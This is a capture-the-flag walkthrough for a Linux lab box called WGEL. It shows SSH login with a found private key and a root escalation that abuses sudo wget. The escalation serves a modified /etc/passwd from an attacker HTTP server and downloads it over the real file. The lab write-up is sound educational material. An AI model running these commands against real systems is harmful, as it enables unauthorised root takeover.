---
title: "HTB: WGEL Walkthrough"
date: "2025-10-01"
description: "My solution for the WGEL room, covering SSH key access and privilege escalation via sudo wget."
tags: ["htb", "writeup", "linux", "privilege-escalation"]
---

# HTB: WGEL

WGEL is a Linux box that focuses on SSH key usage and a sudo misconfiguration leading to root access.

**Target IP:** `10.10.10.237`

---

## Recon

After initial enumeration, an SSH private key (`id_rsa`) belonging to user `jessie` was discovered.

Before using the key, permissions must be fixed:

```bash
chmod 600 id_rsa.txt
````

---

## User Access (jessie)

SSH into the target using the private key:

```bash
ssh -i id_rsa.txt jessie@10.10.10.237
```

List the home directory:

```bash
ls
```

Output:

```
Desktop  Documents  Downloads  examples.desktop  Music
Pictures  Public  Templates  Videos
```

---

## User Flag

Search for the user flag:

```bash
find ~ -type f -iname "*flag*" 2>/dev/null
```

Found:

```
./Documents/user_flag.txt
```

---

## Privilege Escalation Enumeration

Check sudo permissions:

```bash
sudo -l
```

Result shows `wget` can be executed with sudo privileges.

---

## Root Privilege Escalation

### Idea

If `wget` can be run with sudo, it can overwrite system files such as `/etc/passwd`.
By replacing the root password field with a known hash, root access can be obtained.

---

### Generate Password Hash (Attacker Machine)

```python
import bcrypt

password = "password".encode("utf-8")
hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())

print(hashed_password.decode())
```

---

### Prepare Modified `/etc/passwd`

Replace the root password placeholder (`x`) with the generated hash:

```
root:$2b$12$HASH_HERE:0:0:root:/root:/bin/bash
```

Save the file as `passwd`.

---

### Serve the File (Attacker)

```bash
python3 -m http.server 8000
```

---

### Backup Original passwd (Victim)

```bash
cp /etc/passwd /dev/shm/passwd.bak
```

---

### Overwrite `/etc/passwd`

```bash
sudo wget http://10.10.105.248:8000/passwd -O /etc/passwd
```

---

## Root Access

Switch to root:

```bash
su root
```

Password:

```
password
```

Root shell obtained.

---

## Summary

* SSH key allowed initial access as `jessie`
* `sudo wget` was misconfigured
* Overwriting `/etc/passwd` resulted in root access

This completes the WGEL box.

